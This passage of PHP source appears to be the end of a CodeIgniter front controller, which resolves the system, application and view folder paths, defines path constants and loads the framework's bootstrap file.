	{
		$system_path = $_temp.DIRECTORY_SEPARATOR;
	}
	else
	{
		// Ensure there's a trailing slash
		$system_path = strtr(
			rtrim($system_path, '/\\'),
			'/\\',
			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
		).DIRECTORY_SEPARATOR;
	}

	// Is the system path correct?
	if ( ! is_dir($system_path))
	{
		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
		echo 'Your system folder path does not appear to be set correctly. Please open the following file and correct this: '.pathinfo(__FILE__, PATHINFO_BASENAME);
		exit(3); // EXIT_CONFIG
	}

/*
 * -------------------------------------------------------------------
 *  Now that we know the path, set the main path constants
 * -------------------------------------------------------------------
 */
	// The name of THIS file
	define('SELF', pathinfo(__FILE__, PATHINFO_BASENAME));

	// Path to the system directory
	define('BASEPATH', $system_path);

	// Path to the front controller (this file) directory
	define('FCPATH', dirname(__FILE__).DIRECTORY_SEPARATOR);

	// Name of the "system" directory
	define('SYSDIR', basename(BASEPATH));

	// The path to the "application" directory
	if (is_dir($application_folder))
	{
		if (($_temp = realpath($application_folder)) !== FALSE)
		{
			$application_folder = $_temp;
		}
		else
		{
			$application_folder = strtr(
				rtrim($application_folder, '/\\'),
				'/\\',
				DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
			);
		}
	}
	elseif (is_dir(BASEPATH.$application_folder.DIRECTORY_SEPARATOR))
	{
		$application_folder = BASEPATH.strtr(
			trim($application_folder, '/\\'),
			'/\\',
			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
		);
	}
	else
	{
		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
		echo 'Your application folder path does not appear to be set correctly. Please open the following file and correct this: '.SELF;
		exit(3); // EXIT_CONFIG
	}

	define('APPPATH', $application_folder.DIRECTORY_SEPARATOR);

	// The path to the "views" directory
	if ( ! isset($view_folder[0]) && is_dir(APPPATH.'views'.DIRECTORY_SEPARATOR))
	{
		$view_folder = APPPATH.'views';
	}
	elseif (is_dir($view_folder))
	{
		if (($_temp = realpath($view_folder)) !== FALSE)
		{
			$view_folder = $_temp;
		}
		else
		{
			$view_folder = strtr(
				rtrim($view_folder, '/\\'),
				'/\\',
				DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
			);
		}
	}
	elseif (is_dir(APPPATH.$view_folder.DIRECTORY_SEPARATOR))
	{
		$view_folder = APPPATH.strtr(
			trim($view_folder, '/\\'),
			'/\\',
			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
		);
	}
	else
	{
		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
		echo 'Your view folder path does not appear to be set correctly. Please open the following file and correct this: '.SELF;
		exit(3); // EXIT_CONFIG
	}

	define('VIEWPATH', $view_folder.DIRECTORY_SEPARATOR);

/*
 * --------------------------------------------------------------------
 * LOAD THE BOOTSTRAP FILE
 * --------------------------------------------------------------------
 *
 * And away we go...
 */

require_once BASEPATH.'core/CodeIgniter.php';


?>